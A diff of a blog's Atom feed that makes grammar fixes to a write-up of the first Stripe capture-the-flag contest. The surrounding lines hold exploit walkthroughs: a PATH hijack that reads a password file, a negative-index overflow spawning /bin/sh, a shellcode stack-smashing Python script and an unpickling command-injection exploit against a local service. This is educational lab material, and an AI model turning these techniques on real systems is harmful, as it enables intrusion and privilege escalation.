@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Higher Bytes by bt3</title><link href="http://bt3gl.github.io/" rel="alternate"></link><link href="http://bt3gl.github.io/feeds/gdb.atom.xml" rel="self"></link><id>http://bt3gl.github.io/</id><updated>2014-11-24T04:20:00-05:00</updated><entry><title>The First Stripe CTF</title><link href="http://bt3gl.github.io/the-first-stripe-ctf.html" rel="alternate"></link><updated>2014-11-24T04:20:00-05:00</updated><author><name>bt3</name></author><id>tag:bt3gl.github.io,2014-11-24:the-first-stripe-ctf.html</id><summary type="html">&lt;p&gt;Although I did not have the chance of playing neither of the three Stripe CTFs, I was quite amused when I took a look at the problems. I decided to solve them anyway and I am writing this series of writeups.&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Higher Bytes by bt3</title><link href="http://bt3gl.github.io/" rel="alternate"></link><link href="http://bt3gl.github.io/feeds/gdb.atom.xml" rel="self"></link><id>http://bt3gl.github.io/</id><updated>2014-11-24T04:20:00-05:00</updated><entry><title>The First Stripe CTF</title><link href="http://bt3gl.github.io/the-first-stripe-ctf.html" rel="alternate"></link><updated>2014-11-24T04:20:00-05:00</updated><author><name>bt3</name></author><id>tag:bt3gl.github.io,2014-11-24:the-first-stripe-ctf.html</id><summary type="html">&lt;p&gt;Although I did not have the chance of playing in neither of the three Stripe CTFs, I was quite enthralled when I took a look at the problems. I decided to solve them anyway and I am writing this series of writeups.&lt;/p&gt;
 &lt;p&gt;This post is about the first &lt;a href="https://stripe.com/"&gt;Stripe&lt;/a&gt; CTF, which &lt;a href="https://stripe.com/blog/capture-the-flag-wrap-up"&gt;happened in the beginning of 2012&lt;/a&gt;. I was able to fully reproduce the game by using a &lt;a href="http://www.janosgyerik.com/hacking-contest-on-a-live-cd/"&gt;Live CD Image&lt;/a&gt;. Other options were &lt;a href="https://stripe.com/blog/capture-the-flag-wrap-up"&gt;direct download and BitTorrent&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;This CTF was composed of 6 levels, and its style was very similar to other Wargames I've talked before in this blog (for instance, check &lt;a href="http://overthewire.org/wargames/"&gt;OverTheWire's&lt;/a&gt; &lt;a href="http://bt3gl.github.io/exploiting-the-web-in-20-lessons-natas.html"&gt;Natas&lt;/a&gt;, &lt;a href="http://bt3gl.github.io/smashing-the-stack-for-fun-or-wargames-narnia-0-4.html"&gt;Narnia&lt;/a&gt;, and &lt;a href="http://bt3gl.github.io/cryptography-war-beating-krypton.html"&gt;Krypton&lt;/a&gt;).&lt;/p&gt;
+&lt;p&gt;This CTF was composed of 6 levels, and its style was very similar to other Wargames I've talked about before in this blog (for instance, check &lt;a href="http://overthewire.org/wargames/"&gt;OverTheWire's&lt;/a&gt; &lt;a href="http://bt3gl.github.io/exploiting-the-web-in-20-lessons-natas.html"&gt;Natas&lt;/a&gt;, &lt;a href="http://bt3gl.github.io/smashing-the-stack-for-fun-or-wargames-narnia-0-4.html"&gt;Narnia&lt;/a&gt;, and &lt;a href="http://bt3gl.github.io/cryptography-war-beating-krypton.html"&gt;Krypton&lt;/a&gt;).&lt;/p&gt;
 &lt;hr /&gt;
 &lt;h2&gt;Level 1: Environment Variables&lt;/h2&gt;
 &lt;p&gt;When I booted the image  I got this first message:&lt;/p&gt;
@@ -27,7 +27,7 @@
 &lt;p&gt;First, if you use &lt;code&gt;printf&lt;/code&gt; to send text without a trailing &lt;code&gt;\n&lt;/code&gt; to &lt;strong&gt;stdout&lt;/strong&gt; (the screen), there is no guarantee that any of the text will appear so &lt;a href="http://man7.org/linux/man-pages/man3/fflush.3.html"&gt;fflush&lt;/a&gt; is used to write everything that is buffered  to &lt;strong&gt;stdout&lt;/strong&gt;.&lt;/p&gt;
 &lt;p&gt;Second, &lt;code&gt;system&lt;/code&gt; executes &lt;a href="http://linux.die.net/man/3/system"&gt;any shell command you pass to it&lt;/a&gt;. In the case above, it will find a command through the &lt;a href="http://en.wikipedia.org/wiki/PATH_%28variable%29"&gt;PATH environment variable&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;It's clear that if we manage to change the variable &lt;code&gt;date&lt;/code&gt; to some controlled exploit (such as &lt;code&gt;cat /home/level01/.password&lt;/code&gt;) we  get the program to print the password.&lt;/p&gt;
-&lt;p&gt;Third,  &lt;code&gt;system&lt;/code&gt; outputs the date using a &lt;strong&gt;relative path&lt;/strong&gt; for the &lt;strong&gt;PATH&lt;/strong&gt;.  We just need to change that to the directory where we keep our exploit (&lt;em&gt;e.g.&lt;/em&gt;, &lt;code&gt;pwd&lt;/code&gt;) to have the system &lt;em&gt;forgetting&lt;/em&gt; about the original date function.&lt;/p&gt;
+&lt;p&gt;Third,  &lt;code&gt;system&lt;/code&gt; outputs the date using a &lt;strong&gt;relative path&lt;/strong&gt; for the &lt;strong&gt;PATH&lt;/strong&gt;.  We just need to change that to the directory where we keep our exploit (&lt;em&gt;e.g.&lt;/em&gt;, &lt;code&gt;pwd&lt;/code&gt;) to have the system &lt;em&gt;forget&lt;/em&gt; about the original date function.&lt;/p&gt;
 &lt;p&gt;The final script that leads to the next level's password looks like this:&lt;/p&gt;
 &lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
 2
@@ -60,7 +60,7 @@ chmod +x date
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;And then the results of this reading is printed:&lt;/p&gt;
+&lt;p&gt;And then the results of this read is printed:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;p&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php echo $out ?&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
@@ -188,7 +188,7 @@ chmod +x date
 
 
 &lt;h3&gt;Description of the Exploit&lt;/h3&gt;
-&lt;p&gt;To understand this problem we need to understand the &lt;a href="http://bt3gl.github.io/smashing-the-stack-for-fun-or-wargames-narnia-0-4.html"&gt;design of the stack frame&lt;/a&gt;.  With this in mind, the exploit is crafted as following:&lt;/p&gt;
+&lt;p&gt;To understand this problem we need to understand the &lt;a href="http://bt3gl.github.io/smashing-the-stack-for-fun-or-wargames-narnia-0-4.html"&gt;design of the stack frame&lt;/a&gt;.  With this in mind, the exploit is crafted as follows:&lt;/p&gt;
 &lt;p&gt;1) We input a malicious index that is negative (so it pass the bound checking) to  have a shell running &lt;code&gt;system("/bin/sh");&lt;/code&gt; (which will be able to read password of level3 because it will have its &lt;a href="http://en.wikipedia.org/wiki/User_identifier_(Unix)"&gt;UID&lt;/a&gt;).&lt;/p&gt;
 &lt;p&gt;2) We first need to find the memory location before &lt;strong&gt;fns&lt;/strong&gt; (which should be writable). We fire up &lt;strong&gt;gdb&lt;/strong&gt; and search for the pointer to &lt;strong&gt;buf&lt;/strong&gt;, which is right before &lt;strong&gt;fns&lt;/strong&gt; (this is different each time due to &lt;a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization"&gt;ASLR&lt;/a&gt;):&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;  &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;
@@ -350,7 +350,7 @@ chmod +x date
 &lt;li&gt;Assemble with the &lt;strong&gt;--32 flag&lt;/strong&gt;.&lt;/li&gt;
 &lt;li&gt;Link with the &lt;strong&gt;-m elf_i386&lt;/strong&gt; flag.&lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;Resulting on:&lt;/p&gt;
+&lt;p&gt;Resulting in:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;as&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt;   &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;
 &lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;ld&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt; &lt;span class="n"&gt;elf_i386&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
@@ -381,7 +381,7 @@ chmod +x date
 
 
 &lt;h3&gt;Solving the Problem&lt;/h3&gt;
-&lt;p&gt;Now, all we need to do is writing a snippet in any language which takes that shellcode and some NOPs to overflow the stack of the &lt;em&gt;level04&lt;/em&gt;'s' binary. We write the exploit in Python:&lt;/p&gt;
+&lt;p&gt;Now, all we need to do is write a snippet in any language which takes that shellcode and some NOPs to overflow the stack of the &lt;em&gt;level04&lt;/em&gt;'s' binary. We write the exploit in Python:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;subprocess&lt;/span&gt;
 
 &lt;span class="n"&gt;STACK&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x0804857b&lt;/span&gt;
@@ -405,7 +405,7 @@ chmod +x date
 
 &lt;hr /&gt;
 &lt;h2&gt;Level 5:  Unpickle exploit&lt;/h2&gt;
-&lt;p&gt;The fifth level is an uppercasing &lt;strong&gt;web service&lt;/strong&gt; written in Python, which is split into a HTTP and a worker queue part.&lt;/p&gt;
+&lt;p&gt;The fifth level is an uppercasing &lt;strong&gt;web service&lt;/strong&gt; written in Python, which is split into an HTTP part, and a worker queue part.&lt;/p&gt;
 &lt;p&gt;In this service, a request can be sent  with:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;curl&lt;/span&gt; &lt;span class="n"&gt;localhost&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;9020&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;banana&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;
 &lt;span class="p"&gt;{&lt;/span&gt;
@@ -438,7 +438,7 @@ chmod +x date
 
 
 &lt;p&gt;So, the program serializes jobs with pickle, and  sends them to a series of workers to deserialize and process the job. Once again, the attack surface is in the user input, which is not properly sanitized: this function allows arbitrary data to  be sent to &lt;strong&gt;; job&lt;/strong&gt;.&lt;/p&gt;
-&lt;p&gt;We can exploit it by making the serialization code to execute arbitrary commands by supplying a string such as &lt;strong&gt;; job: &lt;pickled&gt;&lt;/strong&gt;. This will runs some Python code that will give us the password  when unpickled. A great module for this task is &lt;a href="https://docs.python.org/2/library/os.html#os.system"&gt;Python's os.system&lt;/a&gt;, which executes  commands in a subshell.&lt;/p&gt;
+&lt;p&gt;We can exploit it by making the serialization code execute arbitrary commands by supplying a string such as &lt;strong&gt;; job: &lt;pickled&gt;&lt;/strong&gt;. This will run some Python code that will give us the password  when unpickled. A great module for this task is &lt;a href="https://docs.python.org/2/library/os.html#os.system"&gt;Python's os.system&lt;/a&gt;, which executes  commands in a subshell.&lt;/p&gt;
 &lt;p&gt;An example of  exploit in Python is the follwing:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pickle&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
 &lt;span class="n"&gt;HOST&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;localhost:9020&amp;#39;&lt;/span&gt;
